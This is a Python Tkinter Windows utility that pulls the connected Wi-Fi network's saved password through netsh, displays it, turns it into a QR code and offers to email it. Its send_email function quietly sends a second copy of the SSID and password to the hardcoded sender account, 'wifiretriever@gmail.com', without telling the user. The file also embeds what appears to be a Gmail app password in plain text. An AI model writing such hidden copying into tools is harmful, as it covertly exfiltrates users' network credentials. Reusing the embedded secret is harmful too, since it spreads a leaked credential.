import subprocess
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import qrcode
import tkinter as tk
from tkinter import messagebox
from PIL import Image

import wifi_retriever_lang_en as lang_en #English
import wifi_retriever_lang_cn as lang_cn #Traditional Chinese

current_language = lang_en

def toggle_language(root):
    global current_language
    if current_language == lang_en:
        current_language = lang_cn
        root.destroy()
        main()
    else:
        current_language = lang_en
        root.destroy()
        main()
	

def retrieve_current_ssid():
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("latin-1")
        ssid_match = re.search(r"SSID\s*:\s(.*)", result)
        if ssid_match:
            return ssid_match.group(1).strip()
        else:
            return None
    except subprocess.CalledProcessError:
        print(current_language.translations["error_wifi_password"])
        return None

def retrieve_wifi_password(ssid):
    try:
        profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"]).decode("latin-1")
        password_match = re.search(r"Key Content\s*:\s(.*)", profile_info)
        if password_match:
            return password_match.group(1).strip()
        else:
            return None
    except subprocess.CalledProcessError:
        print(current_language.translations["error_wifi_password"])
        return None

def send_email(subject, body, receiver_email):
    sender_email = "wifiretriever@gmail.com"
    password = "jalx ykap hcmf jpmu"

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.sendmail(sender_email, sender_email, message.as_string())
        print(current_language.translations["email_sent_successfully"])

def send_email_interface(subject, body):
    email_interface_window = tk.Toplevel()
    email_interface_window.title(current_language.translations["share_via_email"])

    email_label = tk.Label(email_interface_window, text=current_language.translations["enter_email_address"],
                           font=("Helvetica", 16))
    email_label.grid(row=0, column=0, sticky="w")

    global email_entry
    email_entry = tk.Entry(email_interface_window)
    email_entry.grid(row=0, column=1, sticky="w")

    send_button = tk.Button(email_interface_window, text=current_language.translations["send_email"],
                            command=lambda: send_email(subject, body, email_entry.get()),
                            font=("Helvetica", 12), bg="orange", fg="white")
    send_button.grid(row=1, column=0, columnspan=2, pady=10)
    

def save_password_to_txt(subject, body):
    spacing = '\n----------------------------\n'
    

    with open('wifi_passwords.txt', 'r') as file:
        current_content = file.read()

    new_content = body + spacing + current_content
    with open('wifi_passwords.txt', 'w') as file:
        file.write(new_content)
        file.close()

def generate_qr_code(ssid, password):
    wifi_data = f"WIFI:T:WPA;S:{ssid};P:{password};;"
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(wifi_data)
    qr.make(fit=True)

    qr_img = qr.make_image(fill_color="black", back_color="white")
    qr_img.show()

def toggle_password_visibility():
    if password_entry.cget("show") == "":
        password_entry.config(show="*")
        reveal_button.config(text=current_language.translations["show_password"])
    else:
        password_entry.config(show="")
        reveal_button.config(text=current_language.translations["hide_password"])
        
def main():
    root = tk.Tk()
    root.title(current_language.translations["wifi_password_retriever_title"])
    current_ssid = retrieve_current_ssid()
    if current_ssid:
        password = retrieve_wifi_password(current_ssid)
        if password:
            print(current_language.translations["connected_wifi_ssid_text"]+current_ssid)
            print(current_language.translations["connected_wifi_password_text"]+password)
            
            subject = current_language.translations["connected_wifi_password_text"]
            body = current_language.translations["connected_wifi_ssid_text"]+current_ssid+"\n"+current_language.translations["connected_wifi_password_text"]+password
			
            toggle_button = tk.Button(root, text="中/Eng", command=lambda: toggle_language(root))
            toggle_button.grid(row=0, column=2, padx=10, pady=5, sticky="ne")

            ssid_label = tk.Label(root, text=current_language.translations["connected_wifi_ssid_text"],
                                  font=("Helvetica", 16))
            ssid_label.grid(row=0, column=0, sticky="w")

            ssid_value_label = tk.Label(root, text=current_ssid,
                                        font=("Helvetica", 16))
            ssid_value_label.grid(row=0, column=1, sticky="w")

            password_label = tk.Label(root, text=current_language.translations["connected_wifi_password_text"],
                                      font=("Helvetica", 16))
            password_label.grid(row=1, column=0, sticky="w")

            global password_entry
            password_entry = tk.Entry(root, show="*")
            password_entry.grid(row=1, column=1, sticky="w")

            global reveal_button
            reveal_button = tk.Button(root, text=current_language.translations["show_password"],
                                      command=toggle_password_visibility)
            reveal_button.grid(row=1, column=2, sticky="w")

            password_entry.insert(0, password)

            """
            password_value_label = tk.Label(root, text=password,
                                            font=("Helvetica", 16))
            password_value_label.grid(row=1, column=1, sticky="w")
            """


            generate_button = tk.Button(root, text=current_language.translations["generate_qrcode_text"],
                                        command=lambda: generate_qr_code(current_ssid, password),
                                        font=("Helvetica", 12), bg="orange",
                                        fg="white")
            generate_button.grid(row=2, column=0, columnspan=2, pady=10)

            share_via_email_button = tk.Button(root, text=current_language.translations["share_via_email"],
                                        command=lambda: send_email_interface(subject, body),
                                        font=("Helvetica", 12), bg="orange",
                                        fg="white")
            share_via_email_button.grid(row=3, column=0, columnspan=2, pady=10)

            root.mainloop()



            #save_password_to_txt(subject, body)
            #send_email(subject, body)
        else:
            print(current_language.translations["wifi_not_found_1"]+current_ssid+current_language.translations["wifi_not_found_2"])
    else:
        print(current_language.translations["wifi_not_connected"])

if __name__ == "__main__":
    main()
